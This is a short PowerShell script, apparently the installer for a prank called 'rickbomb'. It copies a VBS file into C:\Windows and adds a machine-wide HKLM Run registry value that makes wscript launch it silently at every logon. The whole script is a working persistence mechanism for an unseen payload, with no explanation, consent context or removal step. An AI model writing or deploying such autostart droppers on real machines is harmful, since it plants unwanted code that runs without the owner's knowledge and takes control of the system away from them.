$CopyFileSplat = @{
    Path = "$PSScriptRoot\rickbomb.vbs"
    Destination = "C:\Windows"
}
Copy-Item @CopyFileSplat -Force

$RegValSplat = @{
    Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Name = "rickbomb"
    PropertyType = "ExpandString"
    Value = "%windir%\system32\wscript.exe /b /nologo %windir%\rickbomb.vbs"
}
New-ItemProperty @RegValSplat -Force

